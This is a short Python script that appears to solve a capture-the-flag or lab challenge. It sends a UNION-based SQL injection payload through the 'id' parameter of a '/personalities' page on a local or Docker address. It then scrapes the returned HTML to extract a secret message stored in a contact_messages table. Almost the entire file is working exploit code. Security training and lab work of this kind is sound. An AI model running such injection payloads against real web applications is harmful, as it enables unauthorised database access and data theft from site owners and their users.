#!/usr/bin/env python3

import sys
import requests
from bs4 import BeautifulSoup

addr = "http://172.17.0.2" if len(sys.argv) > 1 else "http://127.0.0.1"

query = "1' UNION SELECT 'james', message FROM contact_messages WHERE mail = 'james@bond.mi5"
r = requests.get(addr+"/personalities", params={'id':query})

soup = BeautifulSoup(r.text, "html.parser")
secret = (soup.find_all('a')[1].string)[len('james')+1:]
print(secret)
